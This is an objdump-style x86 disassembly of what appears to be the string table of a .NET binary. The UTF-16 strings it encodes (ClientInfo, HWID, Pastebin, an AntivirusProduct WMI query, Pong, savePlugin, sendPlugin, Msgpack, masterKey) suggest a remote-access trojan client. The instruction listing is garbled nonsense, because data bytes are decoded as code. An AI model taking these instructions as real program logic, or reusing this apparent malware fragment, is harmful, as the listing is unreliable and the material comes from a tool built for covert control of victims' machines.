  40c395:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c39b:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c3a1:	74 00                	je     0x40c3a3
  40c3a3:	49                   	dec    %ecx
  40c3a4:	00 6e 00             	add    %ch,0x0(%esi)
  40c3a7:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3ab:	00 09                	add    %cl,(%ecx)
  40c3ad:	48                   	dec    %eax
  40c3ae:	00 57 00             	add    %dl,0x0(%edi)
  40c3b1:	49                   	dec    %ecx
  40c3b2:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3b6:	09 55 00             	or     %edx,0x0(%ebp)
  40c3b9:	73 00                	jae    0x40c3bb
  40c3bb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3bf:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c3c5:	00 13                	add    %dl,(%ebx)
  40c3c7:	4d                   	dec    %ebp
  40c3c8:	00 69 00             	add    %ch,0x0(%ecx)
  40c3cb:	63 00                	arpl   %eax,(%eax)
  40c3cd:	72 00                	jb     0x40c3cf
  40c3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d0:	00 73 00             	add    %dh,0x0(%ebx)
  40c3d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d4:	00 66 00             	add    %ah,0x0(%esi)
  40c3d7:	74 00                	je     0x40c3d9
  40c3d9:	00 03                	add    %al,(%ebx)
  40c3db:	20 00                	and    %al,(%eax)
  40c3dd:	00 09                	add    %cl,(%ecx)
  40c3df:	54                   	push   %esp
  40c3e0:	00 72 00             	add    %dh,0x0(%edx)
  40c3e3:	75 00                	jne    0x40c3e5
  40c3e5:	65 00 00             	add    %al,%gs:(%eax)
  40c3e8:	0b 36                	or     (%esi),%esi
  40c3ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c3ed:	62 00                	bound  %eax,(%eax)
  40c3ef:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c3f5:	46                   	inc    %esi
  40c3f6:	00 61 00             	add    %ah,0x0(%ecx)
  40c3f9:	6c                   	insb   (%dx),%es:(%edi)
  40c3fa:	00 73 00             	add    %dh,0x0(%ebx)
  40c3fd:	65 00 00             	add    %al,%gs:(%eax)
  40c400:	0b 33                	or     (%ebx),%esi
  40c402:	00 32                	add    %dh,(%edx)
  40c404:	00 62 00             	add    %ah,0x0(%edx)
  40c407:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c40d:	50                   	push   %eax
  40c40e:	00 61 00             	add    %ah,0x0(%ecx)
  40c411:	74 00                	je     0x40c413
  40c413:	68 00 00 0f 56       	push   $0x560f0000
  40c418:	00 65 00             	add    %ah,0x0(%ebp)
  40c41b:	72 00                	jb     0x40c41d
  40c41d:	73 00                	jae    0x40c41f
  40c41f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c425:	00 0b                	add    %cl,(%ebx)
  40c427:	41                   	inc    %ecx
  40c428:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c42c:	00 69 00             	add    %ch,0x0(%ecx)
  40c42f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c430:	00 00                	add    %al,(%eax)
  40c432:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c436:	00 75 00             	add    %dh,0x0(%ebp)
  40c439:	65 00 00             	add    %al,%gs:(%eax)
  40c43c:	0b 66 00             	or     0x0(%esi),%esp
  40c43f:	61                   	popa
  40c440:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c444:	00 65 00             	add    %ah,0x0(%ebp)
  40c447:	00 17                	add    %dl,(%edi)
  40c449:	50                   	push   %eax
  40c44a:	00 65 00             	add    %ah,0x0(%ebp)
  40c44d:	72 00                	jb     0x40c44f
  40c44f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c453:	72 00                	jb     0x40c455
  40c455:	6d                   	insl   (%dx),%es:(%edi)
  40c456:	00 61 00             	add    %ah,0x0(%ecx)
  40c459:	6e                   	outsb  %ds:(%esi),(%dx)
  40c45a:	00 63 00             	add    %ah,0x0(%ebx)
  40c45d:	65 00 00             	add    %al,%gs:(%eax)
  40c460:	11 50 00             	adc    %edx,0x0(%eax)
  40c463:	61                   	popa
  40c464:	00 73 00             	add    %dh,0x0(%ebx)
  40c467:	74 00                	je     0x40c469
  40c469:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c46d:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c473:	41                   	inc    %ecx
  40c474:	00 6e 00             	add    %ch,0x0(%esi)
  40c477:	74 00                	je     0x40c479
  40c479:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c47f:	72 00                	jb     0x40c481
  40c481:	75 00                	jne    0x40c483
  40c483:	73 00                	jae    0x40c485
  40c485:	00 13                	add    %dl,(%ebx)
  40c487:	49                   	dec    %ecx
  40c488:	00 6e 00             	add    %ch,0x0(%esi)
  40c48b:	73 00                	jae    0x40c48d
  40c48d:	74 00                	je     0x40c48f
  40c48f:	61                   	popa
  40c490:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c494:	00 65 00             	add    %ah,0x0(%ebp)
  40c497:	64 00 00             	add    %al,%fs:(%eax)
  40c49a:	09 50 00             	or     %edx,0x0(%eax)
  40c49d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c49e:	00 6e 00             	add    %ch,0x0(%esi)
  40c4a1:	67 00 00             	add    %al,(%bx,%si)
  40c4a4:	0b 47 00             	or     0x0(%edi),%eax
  40c4a7:	72 00                	jb     0x40c4a9
  40c4a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4aa:	00 75 00             	add    %dh,0x0(%ebp)
  40c4ad:	70 00                	jo     0x40c4af
  40c4af:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c4b5:	00 2b                	add    %ch,(%ebx)
  40c4b7:	5c                   	pop    %esp
  40c4b8:	00 72 00             	add    %dh,0x0(%edx)
  40c4bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4bc:	00 6f 00             	add    %ch,0x0(%edi)
  40c4bf:	74 00                	je     0x40c4c1
  40c4c1:	5c                   	pop    %esp
  40c4c2:	00 53 00             	add    %dl,0x0(%ebx)
  40c4c5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4c9:	75 00                	jne    0x40c4cb
  40c4cb:	72 00                	jb     0x40c4cd
  40c4cd:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4d3:	43                   	inc    %ebx
  40c4d4:	00 65 00             	add    %ah,0x0(%ebp)
  40c4d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4d8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4dc:	00 72 00             	add    %dh,0x0(%edx)
  40c4df:	32 00                	xor    (%eax),%al
  40c4e1:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c4e7:	6c                   	insb   (%dx),%es:(%edi)
  40c4e8:	00 65 00             	add    %ah,0x0(%ebp)
  40c4eb:	63 00                	arpl   %eax,(%eax)
  40c4ed:	74 00                	je     0x40c4ef
  40c4ef:	20 00                	and    %al,(%eax)
  40c4f1:	2a 00                	sub    (%eax),%al
  40c4f3:	20 00                	and    %al,(%eax)
  40c4f5:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c4f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40c4fd:	20 00                	and    %al,(%eax)
  40c4ff:	41                   	inc    %ecx
  40c500:	00 6e 00             	add    %ch,0x0(%esi)
  40c503:	74 00                	je     0x40c505
  40c505:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c50b:	72 00                	jb     0x40c50d
  40c50d:	75 00                	jne    0x40c50f
  40c50f:	73 00                	jae    0x40c511
  40c511:	50                   	push   %eax
  40c512:	00 72 00             	add    %dh,0x0(%edx)
  40c515:	6f                   	outsl  %ds:(%esi),(%dx)
  40c516:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c51a:	00 63 00             	add    %ah,0x0(%ebx)
  40c51d:	74 00                	je     0x40c51f
  40c51f:	00 17                	add    %dl,(%edi)
  40c521:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c525:	73 00                	jae    0x40c527
  40c527:	70 00                	jo     0x40c529
  40c529:	6c                   	insb   (%dx),%es:(%edi)
  40c52a:	00 61 00             	add    %ah,0x0(%ecx)
  40c52d:	79 00                	jns    0x40c52f
  40c52f:	4e                   	dec    %esi
  40c530:	00 61 00             	add    %ah,0x0(%ecx)
  40c533:	6d                   	insl   (%dx),%es:(%edi)
  40c534:	00 65 00             	add    %ah,0x0(%ebp)
  40c537:	00 07                	add    %al,(%edi)
  40c539:	4e                   	dec    %esi
  40c53a:	00 2f                	add    %ch,(%edi)
  40c53c:	00 41 00             	add    %al,0x0(%ecx)
  40c53f:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c545:	00 13                	add    %dl,(%ebx)
  40c547:	53                   	push   %ebx
  40c548:	00 6f 00             	add    %ch,0x0(%edi)
  40c54b:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c550:	00 61 00             	add    %ah,0x0(%ecx)
  40c553:	72 00                	jb     0x40c555
  40c555:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c55a:	09 70 00             	or     %esi,0x0(%eax)
  40c55d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c55e:	00 6e 00             	add    %ch,0x0(%esi)
  40c561:	67 00 00             	add    %al,(%bx,%si)
  40c564:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c569:	75 00                	jne    0x40c56b
  40c56b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c56f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c570:	00 00                	add    %al,(%eax)
  40c572:	15 73 00 61 00       	adc    $0x610073,%eax
  40c577:	76 00                	jbe    0x40c579
  40c579:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c57d:	6c                   	insb   (%dx),%es:(%edi)
  40c57e:	00 75 00             	add    %dh,0x0(%ebp)
  40c581:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c585:	6e                   	outsb  %ds:(%esi),(%dx)
  40c586:	00 00                	add    %al,(%eax)
  40c588:	07                   	pop    %es
  40c589:	44                   	inc    %esp
  40c58a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c58e:	00 00                	add    %al,(%eax)
  40c590:	15 73 00 65 00       	adc    $0x650073,%eax
  40c595:	6e                   	outsb  %ds:(%esi),(%dx)
  40c596:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c59a:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c59e:	00 67 00             	add    %ah,0x0(%edi)
  40c5a1:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c5a7:	48                   	dec    %eax
  40c5a8:	00 61 00             	add    %ah,0x0(%ecx)
  40c5ab:	73 00                	jae    0x40c5ad
  40c5ad:	68 00 65 00 73       	push   $0x73006500
  40c5b2:	00 00                	add    %al,(%eax)
  40c5b4:	09 48 00             	or     %ecx,0x0(%eax)
  40c5b7:	61                   	popa
  40c5b8:	00 73 00             	add    %dh,0x0(%ebx)
  40c5bb:	68 00 00 1b 50       	push   $0x501b0000
  40c5c0:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5c4:	00 67 00             	add    %ah,0x0(%edi)
  40c5c7:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5cd:	50                   	push   %eax
  40c5ce:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5d2:	00 67 00             	add    %ah,0x0(%edi)
  40c5d5:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5db:	52                   	push   %edx
  40c5dc:	00 75 00             	add    %dh,0x0(%ebp)
  40c5df:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5e0:	00 00                	add    %al,(%eax)
  40c5e2:	0f 4d 00             	cmovge (%eax),%eax
  40c5e5:	73 00                	jae    0x40c5e7
  40c5e7:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c5eb:	61                   	popa
  40c5ec:	00 63 00             	add    %ah,0x0(%ebx)
  40c5ef:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c5f2:	11 52 00             	adc    %edx,0x0(%edx)
  40c5f5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c5f9:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c5fd:	76 00                	jbe    0x40c5ff
  40c5ff:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c604:	0b 45 00             	or     0x0(%ebp),%eax
  40c607:	72 00                	jb     0x40c609
  40c609:	72 00                	jb     0x40c60b
  40c60b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c60c:	00 72 00             	add    %dh,0x0(%edx)
  40c60f:	00 47 6d             	add    %al,0x6d(%edi)
  40c612:	00 61 00             	add    %ah,0x0(%ecx)
  40c615:	73 00                	jae    0x40c617
  40c617:	74 00                	je     0x40c619
  40c619:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c61d:	4b                   	dec    %ebx
  40c61e:	00 65 00             	add    %ah,0x0(%ebp)
  40c621:	79 00                	jns    0x40c623
  40c623:	20 00                	and    %al,(%eax)
  40c625:	63 00                	arpl   %eax,(%eax)
  40c627:	61                   	popa
  40c628:	00 6e 00             	add    %ch,0x0(%esi)
  40c62b:	20 00                	and    %al,(%eax)
  40c62d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c62e:	00 6f 00             	add    %ch,0x0(%edi)
  40c631:	74 00                	je     0x40c633
  40c633:	20 00                	and    %al,(%eax)
  40c635:	62 00                	bound  %eax,(%eax)
  40c637:	65 00 20             	add    %ah,%gs:(%eax)
  40c63a:	00 6e 00             	add    %ch,0x0(%esi)
  40c63d:	75 00                	jne    0x40c63f
  40c63f:	6c                   	insb   (%dx),%es:(%edi)
  40c640:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c644:	00 6f 00             	add    %ch,0x0(%edi)
  40c647:	72 00                	jb     0x40c649
  40c649:	20 00                	and    %al,(%eax)
  40c64b:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c64f:	70 00                	jo     0x40c651
  40c651:	74 00                	je     0x40c653
  40c653:	79 00                	jns    0x40c655
  40c655:	2e 00 00             	add    %al,%cs:(%eax)
  40c658:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c65d:	70 00                	jo     0x40c65f
  40c65f:	75 00                	jne    0x40c661
  40c661:	74 00                	je     0x40c663
  40c663:	20 00                	and    %al,(%eax)
  40c665:	63 00                	arpl   %eax,(%eax)
  40c667:	61                   	popa
  40c668:	00 6e 00             	add    %ch,0x0(%esi)
  40c66b:	20 00                	and    %al,(%eax)
  40c66d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c66e:	00 6f 00             	add    %ch,0x0(%edi)
  40c671:	74 00                	je     0x40c673
  40c673:	20 00                	and    %al,(%eax)
  40c675:	62 00                	bound  %eax,(%eax)
  40c677:	65 00 20             	add    %ah,%gs:(%eax)
  40c67a:	00 6e 00             	add    %ch,0x0(%esi)
  40c67d:	75 00                	jne    0x40c67f
  40c67f:	6c                   	insb   (%dx),%es:(%edi)
  40c680:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c684:	00 00                	add    %al,(%eax)
  40c686:	55                   	push   %ebp
  40c687:	49                   	dec    %ecx
  40c688:	00 6e 00             	add    %ch,0x0(%esi)
  40c68b:	76 00                	jbe    0x40c68d
  40c68d:	61                   	popa
  40c68e:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c692:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c696:	00 6d 00             	add    %ch,0x0(%ebp)
  40c699:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c69d:	73 00                	jae    0x40c69f
  40c69f:	61                   	popa
  40c6a0:	00 67 00             	add    %ah,0x0(%edi)
  40c6a3:	65 00 20             	add    %ah,%gs:(%eax)
  40c6a6:	00 61 00             	add    %ah,0x0(%ecx)
  40c6a9:	75 00                	jne    0x40c6ab
  40c6ab:	74 00                	je     0x40c6ad
  40c6ad:	68 00 65 00 6e       	push   $0x6e006500
  40c6b2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6b6:	00 63 00             	add    %ah,0x0(%ebx)
  40c6b9:	61                   	popa
  40c6ba:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6be:	00 6f 00             	add    %ch,0x0(%edi)
  40c6c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6c2:	00 20                	add    %ah,(%eax)
  40c6c4:	00 63 00             	add    %ah,0x0(%ebx)
  40c6c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6c8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6cc:	00 20                	add    %ah,(%eax)
  40c6ce:	00 28                	add    %ch,(%eax)
  40c6d0:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6d3:	41                   	inc    %ecx
  40c6d4:	00 43 00             	add    %al,0x0(%ebx)
  40c6d7:	29 00                	sub    %eax,(%eax)
  40c6d9:	2e 00 00             	add    %al,%cs:(%eax)
  40c6dc:	05 58 00 32 00       	add    $0x320058,%eax
  40c6e1:	00 0f                	add    %cl,(%edi)
  40c6e3:	7b 00                	jnp    0x40c6e5
  40c6e5:	30 00                	xor    %al,(%eax)
  40c6e7:	3a 00                	cmp    (%eax),%al
  40c6e9:	44                   	inc    %esp
  40c6ea:	00 33                	add    %dh,(%ebx)
  40c6ec:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ef:	20 00                	and    %al,(%eax)
  40c6f1:	00 0f                	add    %cl,(%edi)
  40c6f3:	7b 00                	jnp    0x40c6f5
  40c6f5:	30 00                	xor    %al,(%eax)
  40c6f7:	3a 00                	cmp    (%eax),%al
  40c6f9:	58                   	pop    %eax
  40c6fa:	00 32                	add    %dh,(%edx)
  40c6fc:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6ff:	20 00                	and    %al,(%eax)
  40c701:	00 2b                	add    %ch,(%ebx)
  40c703:	28 00                	sub    %al,(%eax)
  40c705:	6e                   	outsb  %ds:(%esi),(%dx)
  40c706:	00 65 00             	add    %ah,0x0(%ebp)
  40c709:	76 00                	jbe    0x40c70b
  40c70b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c70f:	20 00                	and    %al,(%eax)
  40c711:	75 00                	jne    0x40c713
  40c713:	73 00                	jae    0x40c715
  40c715:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c71a:	00 20                	add    %ah,(%eax)
  40c71c:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c720:	00 70 00             	add    %dh,0x0(%eax)
  40c723:	65 00 20             	add    %ah,%gs:(%eax)
  40c726:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c729:	63 00                	arpl   %eax,(%eax)
  40c72b:	31 00                	xor    %eax,(%eax)
  40c72d:	00 45 28             	add    %al,0x28(%ebp)
  40c730:	00 65 00             	add    %ah,0x0(%ebp)
  40c733:	78 00                	js     0x40c735
  40c735:	74 00                	je     0x40c737
  40c737:	38 00                	cmp    %al,(%eax)
  40c739:	2c 00                	sub    $0x0,%al
  40c73b:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c73f:	74 00                	je     0x40c741
  40c741:	31 00                	xor    %eax,(%eax)
  40c743:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c747:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c74b:	33 00                	xor    (%eax),%eax
  40c74d:	32 00                	xor    (%eax),%al
  40c74f:	29 00                	sub    %eax,(%eax)
  40c751:	20 00                	and    %al,(%eax)
  40c753:	74 00                	je     0x40c755
  40c755:	79 00                	jns    0x40c757
  40c757:	70 00                	jo     0x40c759
  40c759:	65 00 20             	add    %ah,%gs:(%eax)
  40c75c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c75f:	63 00                	arpl   %eax,(%eax)
  40c761:	37                   	aaa
  40c762:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c765:	24 00                	and    $0x0,%al
  40c767:	63 00                	arpl   %eax,(%eax)
  40c769:	38 00                	cmp    %al,(%eax)
  40c76b:	2c 00                	sub    $0x0,%al
  40c76d:	24 00                	and    $0x0,%al
  40c76f:	63 00                	arpl   %eax,(%eax)
  40c771:	39 00                	cmp    %eax,(%eax)
  40c773:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c776:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c77a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c77d:	24 f5                	and    $0xf5,%al
  40c77f:	ac                   	lods   %ds:(%esi),%al
  40c780:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c787:	7a 5c                	jp     0x40c7e5
  40c789:	56                   	push   %esi
  40c78a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c78d:	89 03                	mov    %eax,(%ebx)
  40c78f:	00 00                	add    %al,(%eax)
  40c791:	01 03                	add    %eax,(%ebx)
  40c793:	20 00                	and    %al,(%eax)
  40c795:	01 02                	add    %eax,(%edx)
  40c797:	06                   	push   %es
  40c798:	0e                   	push   %cs
  40c799:	03 06                	add    (%esi),%eax
  40c79b:	12 09                	adc    (%ecx),%cl
  40c79d:	03 06                	add    (%esi),%eax
  40c79f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c7a3:	00 02                	add    %al,(%edx)
  40c7a5:	03 06                	add    (%esi),%eax
  40c7a7:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c7ad:	03 06                	add    (%esi),%eax
  40c7af:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c7b4:	03 06                	add    (%esi),%eax
  40c7b6:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c7bc:	06                   	push   %es
  40c7bd:	1c 02                	sbb    $0x2,%al
  40c7bf:	06                   	push   %es
  40c7c0:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7c3:	00 12                	add    %dl,(%edx)
  40c7c5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7ca:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7d0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7d6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7d9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7df:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c7e5:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7e8:	01 01                	add    %eax,(%ecx)
  40c7ea:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7ed:	00 12                	add    %dl,(%edx)
  40c7ef:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c7f4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c7fa:	02 03                	add    (%ebx),%al
  40c7fc:	00 00                	add    %al,(%eax)
  40c7fe:	1c 03                	sbb    $0x3,%al
  40c800:	00 00                	add    %al,(%eax)
  40c802:	08 04 00             	or     %al,(%eax,%eax,1)
  40c805:	01 01                	add    %eax,(%ecx)
  40c807:	08 04 00             	or     %al,(%eax,%eax,1)
  40c80a:	01 02                	add    %eax,(%edx)
  40c80c:	0e                   	push   %cs
  40c80d:	0a 00                	or     (%eax),%al
  40c80f:	04 02                	add    $0x2,%al
  40c811:	1c 12                	sbb    $0x12,%al
  40c813:	19 12                	sbb    %edx,(%edx)
  40c815:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c81a:	01 01                	add    %eax,(%ecx)
  40c81c:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c822:	1c 04                	sbb    $0x4,%al
  40c824:	08 00                	or     %al,(%eax)
  40c826:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c82c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c82f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c835:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c838:	00 12                	add    %dl,(%edx)
  40c83a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c83f:	03 08                	add    (%eax),%ecx
  40c841:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c844:	08 00                	or     %al,(%eax)
  40c846:	08 03                	or     %al,(%ebx)
  40c848:	00 00                	add    %al,(%eax)
  40c84a:	0e                   	push   %cs
  40c84b:	04 00                	add    $0x0,%al
  40c84d:	01 0e                	add    %ecx,(%esi)
  40c84f:	0e                   	push   %cs
  40c850:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c856:	d5 0a                	aad    $0xa
  40c858:	3a 06                	cmp    (%esi),%al
  40c85a:	00 01                	add    %al,(%ecx)
  40c85c:	12 29                	adc    (%ecx),%ch
  40c85e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c864:	03 00                	add    (%eax),%eax
  40c866:	00 18                	add    %bl,(%eax)
  40c868:	07                   	pop    %es
  40c869:	00 03                	add    %al,(%ebx)
  40c86b:	08 18                	or     %bl,(%eax)
  40c86d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c873:	18 0e                	sbb    %cl,(%esi)
  40c875:	06                   	push   %es
  40c876:	00 02                	add    %al,(%edx)
  40c878:	02 18                	add    (%eax),%bl
  40c87a:	10 02                	adc    %al,(%edx)
  40c87c:	06                   	push   %es
  40c87d:	00 01                	add    %al,(%ecx)
  40c87f:	11 30                	adc    %esi,(%eax)
  40c881:	11 30                	adc    %esi,(%eax)
  40c883:	06                   	push   %es
  40c884:	00 03                	add    %al,(%ebx)
  40c886:	01 09                	add    %ecx,(%ecx)
  40c888:	09 09                	or     %ecx,(%ecx)
  40c88a:	02 06                	add    (%esi),%al
  40c88c:	09 03                	or     %eax,(%ebx)
  40c88e:	06                   	push   %es
  40c88f:	11 30                	adc    %esi,(%eax)
  40c891:	04 00                	add    $0x0,%al
  40c893:	00 00                	add    %al,(%eax)
  40c895:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c899:	00 00                	add    %al,(%eax)
  40c89b:	04 01                	add    $0x1,%al
  40c89d:	00 00                	add    %al,(%eax)
  40c89f:	00 06                	add    %al,(%esi)
  40c8a1:	00 02                	add    %al,(%edx)
  40c8a3:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c8a6:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c8ab:	0e                   	push   %cs
  40c8ac:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8b1:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c8b6:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8bb:	60                   	pusha
  40c8bc:	05 00 01 01 12       	add    $0x12010100,%eax
  40c8c1:	60                   	pusha
  40c8c2:	04 00                	add    $0x0,%al
  40c8c4:	01 01                	add    %eax,(%ecx)
  40c8c6:	0e                   	push   %cs
  40c8c7:	18 06                	sbb    %al,(%esi)
  40c8c9:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8ce:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8d1:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8d4:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8da:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8df:	0e                   	push   %cs
  40c8e0:	04 20                	add    $0x20,%al
  40c8e2:	00 00                	add    %al,(%eax)
  40c8e4:	00 04 40             	add    %al,(%eax,%eax,2)
  40c8e7:	00 00                	add    %al,(%eax)
  40c8e9:	00 04 10             	add    %al,(%eax,%edx,1)
  40c8ec:	00 00                	add    %al,(%eax)
  40c8ee:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c8f1:	01 01                	add    %eax,(%ecx)
  40c8f3:	0e                   	push   %cs
  40c8f4:	04 20                	add    $0x20,%al
  40c8f6:	01 0e                	add    %ecx,(%esi)
  40c8f8:	0e                   	push   %cs
  40c8f9:	06                   	push   %es
  40c8fa:	20 01                	and    %al,(%ecx)
  40c8fc:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c901:	20 02                	and    %al,(%edx)
  40c903:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c909:	00 01                	add    %al,(%ecx)
  40c90b:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c910:	06                   	push   %es
  40c911:	11 50 03             	adc    %edx,0x3(%eax)
  40c914:	06                   	push   %es
  40c915:	12 55 05             	adc    0x5(%ebp),%dl
  40c918:	00 01                	add    %al,(%ecx)
  40c91a:	0e                   	push   %cs
  40c91b:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c920:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c925:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c92b:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c931:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c937:	01 01                	add    %eax,(%ecx)
  40c939:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c93e:	60                   	pusha
  40c93f:	03 20                	add    (%eax),%esp
  40c941:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c944:	20 00                	and    %al,(%eax)
  40c946:	02 03                	add    (%ebx),%al
  40c948:	28 00                	sub    %al,(%eax)
